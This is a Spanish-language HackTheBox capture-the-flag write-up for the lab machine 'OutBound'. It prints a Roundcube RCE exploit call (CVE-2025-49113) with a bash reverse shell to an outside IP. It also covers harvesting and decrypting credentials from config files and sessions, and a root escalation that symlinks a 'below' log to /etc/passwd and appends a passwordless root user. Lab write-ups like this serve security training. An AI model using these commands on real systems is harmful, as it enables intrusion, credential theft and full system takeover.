---
title: "HackTheBox - OutBound"
date: 2025-11-21
platform: "HackTheBox"
logo: "/images/htb.png"
tags: ["Linux", "Roundcube", "CVE-2025-49113", "MySQL", "PHP-RCE", "CVE-2025-27591", "Symlink"]
summary: "Resolución de la máquina OutBound. Explotaremos una vulnerabilidad RCE en Roundcube Webmail 1.6.10, analizaremos sesiones de MySQL para obtener credenciales cifradas y escalaremos privilegios mediante un abuso del binario 'below' (CVE-2025-27591)."
draft: false
---

Esta es la maquina **[[OutBound]]** de **[[HackTheBox]]**. Un laboratorio muy completo donde la enumeración web y el análisis forense de bases de datos son claves para el movimiento lateral.

### Resumen de Técnicas Usadas

| **Técnica** | **Herramienta / Concepto** |
| :--- | :--- |
| **Escaneo de Red y Enumeración** | **[[Nmap]]**, **[[extractPorts]]** |
| **Reconocimiento Web** | **[[Roundcube Webmail]]**, **[[Wappalyzer]]**, **[[/etc/hosts]]** |
| **Explotación Inicial (RCE)** | **[[CVE-2025-49113]]**, **[[PHP Exploit]]**, **[[Reverse Shell]]** |
| **Post-Explotación (Lateral)** | **[[MySQL]]**, **[[config.inc.php]]**, **[[decrypt.sh]]** |
| **Tratamiento de Datos** | **[[Base64 Decoding]]**, **[[Session Table Analysis]]** |
| **Escala de Privilegios** | **[[sudo -l]]**, **[[CVE-2025-27591]]** (**[[Below Abuse]]**) |
| **Técnica de Escalada Final** | **[[Symlink Attack]]**, **[[/etc/passwd Manipulation]]** |

---

Username: **Tyler**
Password: **LhKL1o9Nm3X2**

Lo primero que vamos a hacer es una creación de la carpeta de trabajo:

```sh title:OUTBOUND
cd /home/yoyan/maquina/
mkdir outbound
cd outbound
mkt
ls
 content   exploits   nmap   scripts
```

Esto es para tener las cosas organizadas y ordenadas

---

## Escaneo de Puertos

En este punto lo que vamos a realizar son un escaneo de los puertos que están activos.

```sh title:NMAP
cd nmap
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn [IP_OBJETIVO] -oG AllPorts
#Te creara un archivo grepable para usar despues el extractports
extractPorts AllPorts
#Es un Script que te pone los puertos abierto en la Clipboard
#Una vez con los puertos realizamos un Escaneo mas Exhaustivo
nmap -p22,80 -sCV [IP_OBJETIVO] -oN Target
#Te sale las versiones de los servicios de los puertos abiertos
```

Una vez visto los puertos abiertos y sus versiones podemos ver si son vulnerables o tienes algún **CVE** para realizar un ataque.

Como vimos que el puerto 80 esta abierto hay una pagina web y con la dirección que nos aporto nmap **mail.outbound.htb** y que ponemos en el `/etc/hosts` vemos lo siguiente:

![[Pasted image 20251122123634.png]]

Probamos con las credenciales que nos aporto **HTB** y miramos si funciona tanto para el servicio de **roundcube** o para **SSH**.

y con las credenciales de **tyler:LhKL1o9Nm3X2** podemos acceder a la pagina web.
![[Pasted image 20251122123949.png]]
Investigamos y podemos ver la versión del **roundcube** y miramos si existe una vulnerabilidad, también gracias al **Wappalyzer** podemos ver el lenguaje de programación que usaron para lanzar el **roundcube**. 
![[Pasted image 20251122124142.png]]

Vemos que poniendo en el buscador **Roundcube Webmail 1.6.10 exploit** nos sale un github interesante, que nos habla de un exploit:
![[Pasted image 20251122124538.png]]

Esto nos proporciono al menos como se llama el **CVE** y con esto podemos encontrar uno para el mismo lenguaje de programación.
![[Pasted image 20251122125010.png]]

Y entramos a este y vemos que hace lo mismo pero con el lenguaje de programación **PHP** que esto nos puede dar menos problemas por una mejor compatibilidad. 
https://github.com/fearsoff-org/CVE-2025-49113

Lo que realiza el script este es un [[Remote Code Execution]].

```sh title:CVE-2025-49113
# Explicacion del codigo:
#php CVE-2025-49113.php http://10.10.11.77 [Username]  [Password] "Código Ejecutable"
#Lo que vamos a realizar nosotros es una Reverse Shell y la codificamos en Base64 para que no nos de problemas y escuchar con NetCat.
php CVE-2025-49113.php http://mail.outbound.htb/ tyler 'LhKL1o9Nm3X2' "echo 'bash -c \"bash -i >& /dev/tcp/10.10.15.110/4444 0>&1\"' | base64 | base64 -d | bash"
#En otra Terminal usamo NetCat
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.77 58080
bash: cannot set terminal process group (248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ 
```

Y como podemso ver ya estamos dentro ponemos este comando para que la terminal que nos aporto se lo mas parecido posible a la nuestra y se mas manejable.

```sh title:REVERSE_SHELL
www-data@mail:/var/www/html/roundcube/public_html$ script /dev/null -c bash
```

Ahora lo que nos ponemos a hacer es **investigar por completo la maquina** hasta encontrar algo que nos parezca interesante, una de las cosas que vimos con el **Wappalyzer** que nos puede interesar investigar es la **base de datos** y en los archivos **config**.

En los Archivos del SQL pudimos ver las tablas que crean por defecto **roundcube**, entonces ahora procedemos a mirar los archivos **config** del programa **roundcube** para ver que podemos ver.

```sh title:config.inic.php
www-data@mail:/var/www/html/roundcube/public_html/roundcube/config$ cat config.inc.php
<be/public_html/roundcube/config$ cat config.inc.php                
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

En las **Líneas 24-30** podemos ver las credenciales de la base de datos y el nombre de esta tambien, con ello podemos ejecutar lo siguiente y investigar si hay algo importante:

```sql title:INVESTIGACIÓN
mysql -u roundcube -pRCDBPass2025

show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
use roundcube;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
--Investigamos las tablas mas relevantes.
select * from users;
--Sale client_hash que es un preferences.
select * from identities;
--No vemos nada en identities que sea relevante.
select * from session;
+--------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                
+----------------------------+---------------------+------------+----------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
--Copiamos los archivos Vars y miramos si son importantes, ya que estan codificado en Base64
```

```sh title:DESCODIFICACION_BASE64
echo bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 | base64 -d | sed 's/;/\r\n/g' | > importante.txt
#Sale el texto decodificado a parte de con un tratamiento para separar mejor el texto y importarlo en un txt
```

```ls title:importante.txt
language|s:5:"en_US"
imap_namespace|a:4:{s:8:"personal"
a:1:{i:0
a:2:{i:0
s:0:""
i:1
s:1:"/"
}}s:5:"other"
N
s:6:"shared"
N
s:10:"prefix_out"
s:0:""
}imap_delimiter|s:1:"/"
imap_list_conf|a:2:{i:0
N
i:1
a:0:{}}user_id|i:1
username|s:5:"jacob" #Importante
storage_host|s:9:"localhost"
storage_port|i:143
storage_ssl|b:0
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/" #Importante
login_time|i:1749397119
timezone|s:13:"Europe/London"
STORAGE_SPECIAL-USE|b:1
auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW"
request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw"
task|s:4:"mail"
skin_config|a:7:{s:17:"supported_layouts"
a:1:{i:0
s:10:"widescreen"
}s:22:"jquery_ui_colors_theme"
s:9:"bootstrap"
s:18:"embed_css_location"
s:17:"/styles/embed.css"
s:19:"editor_css_location"
s:17:"/styles/embed.css"
s:17:"dark_mode_support"
b:1
s:26:"media_browser_css_location"
s:4:"none"
s:21:"additional_logo_types"
a:3:{i:0
s:4:"dark"
i:1
s:5:"small"
i:2
s:10:"small-dark"
}}imap_host|s:9:"localhost"
page|i:1
mbox|s:5:"INBOX"
sort_col|s:0:""
sort_order|s:4:"DESC"
STORAGE_THREAD|a:3:{i:0
s:10:"REFERENCES"
i:1
s:4:"REFS"
i:2
s:14:"ORDEREDSUBJECT"
}STORAGE_QUOTA|b:0
STORAGE_LIST-EXTENDED|b:1
list_attrib|a:6:{s:4:"name"
s:8:"messages"
s:2:"id"
s:11:"messagelist"
s:5:"class"
s:42:"listing messagelist sortheader fixedheader"
s:15:"aria-labelledby"
s:22:"aria-label-messagelist"
s:9:"data-list"
s:12:"message_list"
s:14:"data-label-msg"
s:18:"The list is empty."
}unseen_count|a:2:{s:5:"INBOX"
i:2
s:5:"Trash"
i:0
}folders|a:1:{s:5:"INBOX"
a:2:{s:3:"cnt"
i:2
s:6:"maxuid"
i:3
}}list_mod_seq|s:2:"10"
```

Como podemos ver hay dos cosas que nos puede dar una *pista* de donde ir que están en la **línea 19 y 23** que pueden ser posibles contraseñas para el usuario jacob, usamos tanto la **Contraseña** como el **nombre de usuario** para la **aplicación** como para **SSH**

También una buena practica que debemos de realizar siempre es **guardar las contraseñas** **encontradas en un archivo**.

```sh title:Credenciales.txt
Mail Account:
tyler:LhKL1o9Nm3X2
jacob:L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ #Posible contraseña que debemos de probar.

SSH Account:
jacob:L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ #Posible contraseña que debemos de probar.
```

Vemos que la **contraseña** no sirve para ninguna, pero volviendo a mirar bien lo que encontramos en vemos que usan algún **tipo de cifrado** para las **contraseñas de usuario**.

En la maquina dentro de la carpeta que **hostea roundcube** podemos ver un ``/bin`` donde se alojan **Script** `.sh`

```sh title:/bin
www-data@mail:/var/www/html/roundcube/public_html/roundcube/bin$ ls
ls
cleandb.sh    gc.sh		jsshrink.sh	msgimport.sh
cssshrink.sh  indexcontacts.sh	makedoc.sh	update.sh
decrypt.sh    initdb.sh		moduserprefs.sh  updatecss.sh
deluser.sh    installto.sh	msgexport.sh	updatedb.shcat 
www-data@mail:/var/www/html/roundcube/public_html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
595mO8DmwGeD
```

Ponemos las contraseña tanto en nuestro archivo **importante.txt** y volvemos a probarlo tanto en **roundcube** como **SSH** 

```sh title:importante.txt
Mail Account:
tyler:LhKL1o9Nm3X2
jacob:595mO8DmwGeD #Posible contraseña que debemos de probar algo que puede hacer que nos huela bien es que tienen las misma longitud, ya que estan creadas seguramente por algun algoritmo.

SSH Account:
jacob:595mO8DmwGeD #Posible contraseña que debemos de probar.
```

Probamos primero en el **Roundcube** y vemos que nos **funciona**:
![[Pasted image 20251122144639.png]]

Ahora empezamos **investigar** lo que podemos encontrar por este **nuevo usuario** conseguido, vemos que hay dos correos uno de Mel y otro de Tyler, en el de  Mel nos habla de un posible **escalado de privilegio** que se podría hacer con el **below** y en el de Tyler nos cuenta que tenemos una **nueva contraseña** para nuestra cuenta.

Guardamos la contraseña que vemos en el correo que nos envio Tyler al archivo importante.txt:
```sh title:importante.txt

```
```sh title:SSH 
ssh jacob@outbound.htb
jacob@outbound.htb's password: gY4Wr3a1evp4 '
#Nos conectamos mediante SSH con el usuario jacob
jacob@outbound:~$ ls
user.txt
#Miramos para escalar privilegios
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
#Como vimos en el correo que nos envio Mel below puede ser un potencial punto para realizar una escalada de privilegios
```

Ahora buscamos en el navegador **exploit below** y vemos esta pagina que nos cuentan un **CVE** 
https://github.com/rvizx/CVE-2025-27591
Nos explica que es lo que hace el Exploit Code y podemos hacer lo nosotros también

```sh title:Escalada
jacob@outbound:/home/jacob$ cd /var/log/below
jacob@outbound:/var/log/below$ rm -r error_root.log
jacob@outbound:/var/log/below$ ln -s /etc/passwd error_root.log
root@outbound:/var/log/below# ls -la
total 16
drwxrwxrwx  3 root  root   4096 Nov 22 15:20 .
drwxrwxr-x 13 root  syslog 4096 Nov 22 15:00 ..
lrwxrwxrwx  1 jacob jacob    11 Nov 22 15:16 error_jacob.log 
-rw-rw-rw-  1 root  root      0 Nov 22 15:20 error_root.log -> /etc/passwd
drwxr-xr-x  2 root  root   4096 Nov 22 15:00 store
jacob@outbound:/var/log/below$ stat /etc/passwd
  File: /etc/passwd
  Size: 1840      	Blocks: 8          IO Block: 4096   regular file
Device: 8,2	Inode: 16522       Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-11-22 14:59:58.244000256 +0000
Modify: 2025-07-14 16:40:53.253354883 +0000
Change: 2025-07-14 16:40:53.255354883 +0000
 Birth: 2025-07-08 21:06:21.791868493 +0000
jacob@outbound:/var/log/below$ sudo below
jacob@outbound:/var/log/below$ stat /etc/passwd
  File: /etc/passwd
  Size: 1840      	Blocks: 8          IO Block: 4096   regular file
Device: 8,2	Inode: 16522       Links: 1
Access: (0666/-rw-rw-rw-)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-11-22 14:59:58.244000256 +0000
Modify: 2025-07-14 16:40:53.253354883 +0000
Change: 2025-11-22 15:20:00.804110754 +0000
 Birth: 2025-07-08 21:06:21.791868493 +0000
jacob@outbound:/var/log/below$  echo 'pwn::0:0:root:/root:/bin/bash' >> /etc/passwd; su pwn 
root@outbound:/var/log/below# cd 
root@outbound:~# ls
root.txt
```